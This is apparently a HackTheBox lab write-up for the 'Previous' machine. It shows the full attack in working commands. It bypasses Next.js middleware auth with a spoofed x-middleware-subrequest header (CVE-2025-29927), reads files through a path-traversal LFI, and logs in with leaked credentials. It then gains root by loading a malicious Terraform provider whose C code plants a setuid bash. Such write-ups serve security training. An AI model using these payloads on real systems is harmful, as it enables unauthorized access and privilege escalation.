---
title: HackTheBox Previous Writeup
authors: Samarth
date: 2025-10-17 17:26:00 +0530
categories: [HackTheBox, Machines]
tags: [HTB,Linux,Nextjs,Authorization-Bypass,CVE-2025-29927]
math: true
mermaid: true
---

![Previous - HTB](/assets/img/writeups/Previous-HTB/previous.png)

## Initial Enumeration

### Nmap Scan

```console

$ nmap -T4 -n -sC -sV -Pn -p- 10.10.11.83
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 09:48 IST
Warning: 10.10.11.83 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.83
Host is up (0.27s latency).
Not shown: 65351 closed tcp ports (conn-refused), 182 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1137.36 seconds
```

There are two open ports:

* **22** (`SSH`)
* **80** (`HTTP`)

We are also provided with the `previous.htb` hostname in the box, so we add it to our `hosts` file:

```
10.10.11.83 previous.htb
```
{: file="/etc/hosts" }

Visiting `http://previous.htb/`, there is not much; we only see two buttons:

![Web 80 Index](/assets/img/writeups/Previous-HTB/1.png){: width="1200" height="600"}

On `Getstarted` there is login page and url looks like `http://previous.htb/api/auth/signin?callbackUrl=%2Fdocs` and on Click Docs it redirected to same link as well.

### Directory Bruteforcing

```console

$ gobuster dir -u http://previous.htb/ -w /usr/share/wordlists/dirb/common.txt -t 25
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/apis                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fapis]
/api                  (Status: 307) [Size: 35] [--> /api/auth/signin?callbackUrl=%2Fapi]
/cgi-bin/             (Status: 308) [Size: 8] [--> /cgi-bin]
/docs                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fdocs]
/docs41               (Status: 307) [Size: 38] [--> /api/auth/signin?callbackUrl=%2Fdocs41]
/docs51               (Status: 307) [Size: 38] [--> /api/auth/signin?callbackUrl=%2Fdocs51]
/signin               (Status: 200) [Size: 3481]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

The directories with the `307-status code` which uses the proper authorization in the application.

Now let's recon and taking out information of the application like Tech stack/web-server.
By the `Wappalyzer` it shows the results the web application is tu build up on the `nextjs` on the version `nextjs 15.2.2`.

* Finding the latest CVE to this affected version `nextjs 15.2.2`
* **CVE-2025-29927 Nextjs Middleware Authorization bypass**: Next.js uses a special internal HTTP header, `x-middleware-subrequest`, to prevent infinite recursion when middleware is called.
An attacker can spoof this header in an external request, which tricks the Next.js server into treating it as an internal subrequest.
The framework's logic then skips the middleware, allowing the attacker to bypass critical security checks and access restricted areas, such as an `admin panel`. 

By adding the Header,got another endpoint result

```console

$ gobuster dir -u http://previous.htb/api -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://previous.htb/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 308) [Size: 12] [--> /api/cgi-bin]
/download             (Status: 400) [Size: 28]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
Now, test this url `http://previous.htb/api/download/FUZZ?=x` using Fuzzing for finding hidden details or any other attack surface.

```console

$ ffuf -u 'http://previous.htb/api/download?FUZZ=abc' -w /opt/SecLists/Discovery/Web-Content/common.txt -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' -mc all -fw 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=a
 :: Wordlist         : FUZZ: /usr/share/fuzzDicts/paramDict/AllParam.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 2
________________________________________________

example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 110ms]
:: Progress: [8603/74332] :: Job [1/1] :: 242 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

## Exploitation

```console

$ curl -I  http://previous.htb/api/download?example=abc -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
HTTP/1.1 404 Not Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 17 Oct 2025 13:05:34 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 26
Connection: keep-alive
ETag: "c8wflmak5q"
Vary: Accept-Encoding
```

here it can be successfully bypass it.

### LFI

Mostly LFI(Local File Inclusion) found on such type of endpoint so let's try it out in this endpoint

```console

$ curl -I  http://previous.htb/api/download?example=/etc/passwd -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
HTTP/1.1 404 Not Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 17 Oct 2025 13:09:11 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 26
Connection: keep-alive
ETag: "c8wflmak5q"
Vary: Accept-Encoding

$ curl -I  http://previous.htb/api/download?example=../../../etc/passwd -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 17 Oct 2025 13:09:42 GMT
Content-Type: application/zip
Content-Length: 787
Connection: keep-alive
Content-Disposition: attachment; filename="passwd"
ETag: "41amqg1v4m26j"
```

Get response `200-status code`

```

$ curl http://previous.htb/api/download?example=../../../etc/passwd -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware'

root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```
Now let's check for sensitive hidden files which helps to build this application.
* On googling it for the nextjs directory/file structure it follows such type of structure:

```
my-next-app/
├── app/
│   ├── layout.js        
│   ├── page.js          
│   ├── about/
│   │   ├── layout.js    
│   │   └── page.js      
│   ├── blog/
│   │   ├── layout.js    
│   │   ├── page.js      
│   │   └── [slug]/
│   │       └── page.js  
│   └── dashboard/
│       ├── layout.js    
│       └── page.js      
├── public/
│   ├── logo.png         
│   └── favicon.ico      
├── node_modules/        
├── package.json         
├── next.config.js       
└── .next/               
```

* For the some of the hidden directory it follows:

```
/app/.next
├── build-manifest.json     
├── prerender-manifest.json  
├── server/
│   ├── pages/               
│   │   └── api/             
│   └── app/                 
├── static/
│   └── chunks/              
├── cache/                   
└── routes-manifest.json     
```
After checking `build-manifest.json`,`prerender-manifest.json` and `routes-manifest.json`,The  `routes-manifest.json` reveals something sensitive about the authentication which is dynamicroutes.

![Nextjs server-files](/assets/img/writeups/Previous-HTB/3.png){: width="1200" height="600"}

After googling it found a github sources a users solving the issue of this hidden endpoint `/app/.next/server/pages/api/auth/[...nextauth].js` and then triggered it get the credentials of the user.

## User.txt

![Nextjs server-files](/assets/img/writeups/Previous-HTB/4.png){: width="1200" height="600"}

* Username=jeremy
* Password=MyNameIsJeremyAndILovePancakes

```console

$ ssh jeremy@previous.htb
jeremy@previous.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-152-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Oct 17 05:23:52 PM UTC 2025

  System load:  0.08              Processes:             215
  Usage of /:   78.9% of 8.76GB   Users logged in:       0
  Memory usage: 9%                IPv4 address for eth0: 10.10.11.83
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
1 of these updates is a standard security update.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Oct 17 17:23:55 2025 from 10.10.14.86
jeremy@previous:~$ cat user.txt
39cc9297200b14d07d605e7e4c8de058
```
## Root.txt

```console

jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```
The suid permission for root user `/usr/bin/terraform` and also `!env_reset` It does not empty the environment variable, but `env_delete+=PATH`

Now,Let's explore the `/opt/examples` directory location of `terraform`.

```console

eremy@previous:/opt/examples$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Oct 17 17:39 .
drwxr-xr-x 5 root root 4096 Aug 21 20:09 ..
-rw-r--r-- 1 root root   18 Apr 12  2025 .gitignore
drwxr-xr-x 3 root root 4096 Aug 21 20:09 .terraform
-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
-rw-r--r-- 1 root root 1097 Oct 17 17:39 terraform.tfstate
jeremy@previous:/opt/examples$ cat main.tf
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```
Now,Checking out the available environment variables

* [Terraform-config-environment-variables](https://developer.hashicorp.com/terraform/cli/config/environment-variables)

Try out this one: `export TF_CLI_CONFIG_FILE="$HOME/.terraformrc-custom"`

```console

jeremy@previous:~$ mkdir backdoor
jeremy@previous:~$ cd backdoor/
jeremy@previous:~/backdoor$ cat > terraform-provider-examples_v0.1_linux_amd64.c << 'EOF'
> #include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
    return 0;
}
> EOF
jeremy@previous:~/backdoor$ gcc -o terraform-provider-examples_v0.1_linux_amd64 terraform-provider-examples_v0.1_linux_amd64.c
jeremy@previous:~/backdoor$ cat > dev.tfrc << 'EOF'
> provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/home/jeremy/backdoor"
  }
  direct {}
}
> EOF
jeremy@previous:~/backdoor$ export TF_CLI_CONFIG_FILE=/home/jeremy/backdoor/dev.tfrc
jeremy@previous:~/backdoor$  echo $TF_CLI_CONFIG_FILE
/home/jeremy/backdoor/dev.tfrc
jeremy@previous:~/backdoor$ sudo /usr/bin/terraform -chdir=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /home/jeremy/backdoor
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may cause the state to become
│ incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load the schema for provider
│ previous.htb/terraform/examples: failed to instantiate provider "previous.htb/terraform/examples" to obtain schema: Unrecognized
│ remote plugin message: 
│ Failed to read any lines from plugin's stdout
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /home/jeremy/backdoor/terraform-provider-examples_v0.1_linux_amd64
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│   ELF architecture: EM_X86_64 (current architecture: amd64)
│ ..
╵
jeremy@previous:~/backdoor$ ls -la /tmp/rootbash 
-rwsr-xr-x 1 root root 1396520 Oct 17 18:15 /tmp/rootbash
jeremy@previous:~/backdoor$ /tmp/rootbash -p

rootbash-5.1# id
uid=1000(jeremy) gid=1000(jeremy) euid=0(root) groups=1000(jeremy)
rootbash-5.1# cat /root/root.txt 
a7425763417225c162ac88a8a40d39f6
```


SEE YOU IN THE NEXT ONE:)